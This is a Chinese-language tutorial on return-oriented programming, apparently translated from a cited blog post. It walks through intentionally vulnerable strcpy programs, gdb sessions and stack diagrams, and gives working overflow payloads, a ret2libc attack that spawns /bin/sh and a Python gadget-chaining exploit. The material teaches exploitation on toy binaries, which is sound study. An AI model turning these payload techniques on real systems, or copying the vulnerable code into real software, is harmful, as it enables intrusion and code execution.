Return Oriented Programming (ROP)可以对抗常见的漏洞防御策略。ROP可用于规避地址空间布局随机化（ASLR）和DEP。

当使用ROP时，攻击者在从函数返回之前使用栈的控制来将代码执行定向到程序中的其他位置。除了的二进制代码之外，攻击者可以很容易地找到位于固定位置(绕过ASLR)和可执行位置(绕过DEP)的部分代码。此外，将几个有效负载链接起来以实现(几乎)任意的代码执行是相对简单的。

# 1、第一个ROP实践

使用ROP在一个非常简单的二进制中调用一个函数not_called。如果在正常情况下，这个函数不会被调用。

```c
void not_called() {
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

通过反编译可以得到这个vulnerable_function函数的地址和使用的缓冲区大小：

```c
$ gdb -q a.out
Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.
(gdb) disas vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x08048464 <+0>:  push   %ebp
   0x08048465 <+1>:  mov    %esp,%ebp
   0x08048467 <+3>:  sub    $0x88,%esp
   0x0804846d <+9>:  mov    0x8(%ebp),%eax
   0x08048470 <+12>: mov    %eax,0x4(%esp)
   0x08048474 <+16>: lea    -0x6c(%ebp),%eax
   0x08048477 <+19>: mov    %eax,(%esp)
   0x0804847a <+22>: call   0x8048340 <strcpy@plt>
   0x0804847f <+27>: leave  
   0x08048480 <+28>: ret   
End of assembler dump.
(gdb) print not_called
$1 = {<text variable, no debug info>} 0x8048444 <not_called>
```

可以看到not_called函数地址为0x8048444，缓冲区大小为0x6c个字节。

在调用strcpy@plt之前，堆栈实际上是这样的:

```
| <argument>          |
| <return address>    |
| <old %ebp>          | <= %ebp
| <0x6c bytes of      |
|       ...           |
|       buffer>       |
| <argument>          |
| <address of buffer> | <= %esp
```

因为我们想要覆盖返回地址，所以我们提供0x6c字节来填充缓冲区，4字节来替换旧的%ebp，从而指向我们想指向的地址：

```
| 0x8048444 <not_called>     |
| 0x42424242 <fake old %ebp> |
| 0x41414141 ...             |
|   ... (0x6c bytes of 'A's) |
|   ... 0x41414141           |
```

在shell中测试的结果如下：

```c
$ ./a.out "$(python -c 'print "A"*0x6c + "BBBB" + "\x44\x84\x04\x08"')"
Enjoy your shell!
$ 
```

# 2、调用参数

现在我们可以返回到一个任意的函数，我们希望能够传递任意的参数。我们将利用下面这个简单的程序

```c
char* not_used = "/bin/sh";

void not_called() {
    printf("Not quite a shell...\n");
    system("/bin/date");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

这一次，我们不能简单地返回到not_called函数。相反，我们希望使用正确的参数调用system。首先，我们使用gdb打印出我们需要的值:

```c
$ gdb -q a.out
Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.
(gdb) pring 'system@plt'
$1 = {<text variable, no debug info>} 0x8048360 <system@plt>
(gdb) x/s not_used
0x8048580:   "/bin/sh"
```

为了使用参数not_used调用系统，我们必须设置堆栈。在系统被调用后，它期望堆栈是这样的:

```
| <argument>       |
| <return address> |
```

我们将构造有效负载，使堆栈看起来像在返回后立即调用system(not_used)。因此我们使我们的有效载荷:

```
| 0x8048580 <not_used>             |
| 0x43434343 <fake return address> |
| 0x8048360 <address of system>    |
| 0x42424242 <fake old %ebp>       |
| 0x41414141 ...                   |
|   ... (0x6c bytes of 'A's)       |
|   ... 0x41414141                 |

```

在shell中尝试如下：

```c
$ ./a.out "$(python -c 'print "A"*0x6c + "BBBB" + "\x60\x83\x04\x08" + "CCCC" + "\x80\x85\x04\x08"')"
$
```

# 3、Return to `libc`

到目前为止，我们只看到了包含我们开发所需要的部分的人为的二进制文件。幸运的是，ROP仍然相当简单，没有这个障碍。诀窍是要认识到，使用共享库中的函数的程序(如来自libc的printf)将在运行时将整个库链接到它们的地址空间。这意味着即使它们从不调用system, system(以及libc中的所有其他函数)的代码也可以在运行时访问。我们可以在gdb中很容易地看到这一点:

```c
$ ulimit -s unlimited
$ gdb -q a.out
Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048404
(gdb) run
Starting program: /home/ppp/a.out 

Breakpoint 1, 0x08048404 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x555d2430 <system>
(gdb) find 0x555d2430, +999999999999, "/bin/sh"
0x556f3f18
warning: Unable to access target memory at 0x5573a420, halting search.
1 pattern found.
```

首先，使用ulimit -s unlimited将禁用32位程序上的库随机化。接下来，我们必须在加载库之后运行程序并在main函数中断，以便在共享库中打印值(但是在我们这样做之后，甚至程序未使用的函数也可用于我们)。最后，libc库实际上包含字符串/bin/sh，我们可以在gdb中找到这个字符串，用于攻击!

将这两个地址都插入到我们之前的漏洞中是相当简单的:

```c
$ ./a.out "$(python -c 'print "A"*0x6c + "BBBB" + "\x30\x24\x5d\x55" + "CCCC" + "\x18\x3f\x6f\x55"')"
$
```

# 4、Chaining gadgets

**使用ROP，可以做比调用单个函数更强大的事情。**事实上，我们可以使用它来运行任意代码，而不只是调用可用的函数。我们通过返回gadget来实现这一点，gadget是以ret结尾的短序列指令。例如，可以使用下面的一对gadget来将任意值写入任意位置:

```
pop %ecx
pop %eax
ret
```

```
mov %eax, (%ecx)
ret
```

这些函数通过从栈(我们控制的栈)中弹出值到寄存器中，然后执行使用这些代码来工作。使用时，我们这样设置栈:

```
| <address of mov %eax, (%ecx)>        |
| <value to write>                     |
| <address to write to>                |
| <address of pop %ecx; pop %eax; ret> |
```

你可以看到第一个gadget返回到第二个gadget，继续执行攻击者控制的代码执行链(下一个gadget可以继续执行)。

其他有用的小工具（gadget）包括xchg %eax、%esp和add $0x1c、%esp，它们可用于修改堆栈指针并将其旋转到攻击者控制的缓冲区。如果原始漏洞只控制%eip(类似于格式字符串漏洞)，或者如果攻击者没有控制堆栈的大部分(就像短缓冲区溢出的情况一样)，这是非常有用的。

# 5、Chaining functions

我们还可以使用ROP来链接函数调用：

- 使用pop而不是一个虚构的返回地址;
- ret小工具将堆栈移到第一个函数的参数之上。因为我们只用pop;
- ret小工具调整堆栈，我们不关心它进入什么寄存器(值将被忽略)。

作为一个例子，我们将使用下面的代码：

```C
char string[100];

void exec_string() {
    system(string);
}

void add_bin(int magic) {
    if (magic == 0xdeadbeef) {
        strcat(string, "/bin");
    }
}

void add_sh(int magic1, int magic2) {
    if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
        strcat(string, "/sh");
    }
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    string[0] = 0;
    vulnerable_function(argv[1]);
    return 0;
}
```

我们可目标是调用add_bin，然后是add_sh，然后是exec_string。当我们调用add_bin，堆栈必须看起来像:

```
| <argument>       |
| <return address> |
```

我们希望参数为0xdeadbeef，我们希望返回地址为pop； ret小工具。 这将从堆栈中删除0xdeadbeef，并返回到堆栈中的下一个小工具。 因此，我们有一个小工具来调用add_bin(0xdeadbeef)，如下所示：

```
| 0xdeadbeef            |
| <address of pop; ret> |
| <address of add_bin>  |
```

因为add_sh(0xcafebabe, 0x0badf00d)使用两个参数，所以我们需要一个pop;po;ret:

```
| 0x0badf00d                 |
| 0xcafebabe                 |
| <address of pop; pop; ret> |
| <address of add_sh>        |
```

放在一起就是：

```
| <address of exec_string>     |
| 0x0badf00d                   |
| 0xcafebabe                   |
| <address of pop; pop; ret>   |
| <address of add_sh>          |
| 0xdeadbeef                   |
| <address of pop; ret>        |
| <address of add_bin>         |
| 0x42424242 (fake saved %ebp) |
| 0x41414141 ...               |
|   ... (0x6c bytes of 'A's)   |
|   ... 0x41414141             |
```

这次我们将使用一个python包装器(它还将展示非常有用的struct python模块的使用)。

```python
#!/usr/bin/python

import os
import struct

# These values were found with `objdump -d a.out`.
pop_ret = 0x8048474
pop_pop_ret = 0x8048473
exec_string = 0x08048414
add_bin = 0x08048428
add_sh = 0x08048476

# First, the buffer overflow.
payload =  "A"*0x6c
payload += "BBBB"

# The add_bin(0xdeadbeef) gadget.
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

# The add_sh(0xcafebabe, 0x0badf00d) gadget.
payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0xbadf00d)

# Our final destination.
payload += struct.pack("I", exec_string)

os.system("./a.out \"%s\"" % payload)
```



参考链接：

http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html#fn-2